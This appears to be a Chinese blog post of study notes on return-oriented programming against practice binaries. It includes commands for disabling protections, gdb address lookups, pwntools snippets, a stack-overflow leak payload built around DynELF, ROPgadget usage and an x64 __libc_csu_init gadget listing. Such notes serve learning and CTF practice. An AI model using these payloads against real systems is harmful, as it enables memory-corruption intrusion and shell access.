---
layout: post
title: 一步一步学ROP笔记
slug: note
date: 2018-03-28 14:45
status: publish
author: yuri
tags: 
  - pwn
  - ROP
categories:
  - pwn
excerpt: ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等).

---

# 一步一步学ROP笔记
> 原文地址: [一步一步学ROP](drops.wooyun.org/tips/6597)

## x86 

### 无保护

* 关掉canary:  **-fno-stack-protector**
* 关掉NX:  **-z execstack**
* 关掉PIE:  **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space**

### 绕过NX

gdb下找`system()`和`"/bin/sh\x00"`的地址:

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e5f460 <system>
(gdb) print __libc_start_main
$2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
(gdb) find 0xb7e393f0, +2200000, "/bin/sh"
0xb7f81ff8
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  "/bin/sh"
```

### 绕过NX和PIE

* 看plt : **objdump -d -j .plt level2**
* 看got : **objdump -R level2**
* 查看目标程序调用的so库 : **ldd level2**

用pwntools: 

```python
elf = ELF('level2')
plt_write = elf.symbols['write']
got_write = elf.got['write']

libc = ELF('libc.so')
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
```

### 无libc.so

步骤: 
1. 泄露`__libc_start_main`地址
2. 获取`libc`版本
3. 获取`system`地址与`/bin/sh`的地址
4. 再次执行源程序
5. 触发栈溢出执行`system(“/bin/sh”)`

DynELF的使用: 

```python
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

d = DynELF(leak, elf=ELF('./level2'))
system_addr = d.lookup('system', 'libc')
```

------

## x64

### 传参区别

* 前六个参数保存顺序 : **RDI, RSI, RDX, RCX, R8, R9**

### gadgets

* 找ROP:  **ROPgadget --binary level4 --only "pop|ret"**
* 过滤:  **ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi**

### 通用gadgets part1

`__libc_csu_init()`下: 

```bash
.text:0000000000400840                 public __libc_csu_init
.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:0000000000400840                 push    r15
.text:0000000000400842                 mov     r15d, edi
.text:0000000000400845                 push    r14
.text:0000000000400847                 mov     r14, rsi
.text:000000000040084A                 push    r13
.text:000000000040084C                 mov     r13, rdx
.text:000000000040084F                 push    r12
.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400858                 push    rbp
.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:0000000000400860                 push    rbx
.text:0000000000400861                 sub     rbp, r12
.text:0000000000400864                 xor     ebx, ebx
.text:0000000000400866                 sar     rbp, 3
.text:000000000040086A                 sub     rsp, 8
.text:000000000040086E                 call    _init_proc
.text:0000000000400873                 test    rbp, rbp
.text:0000000000400876                 jz      short loc_400896
.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400880
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
.text:00000000004008A4 __libc_csu_init endp   
```

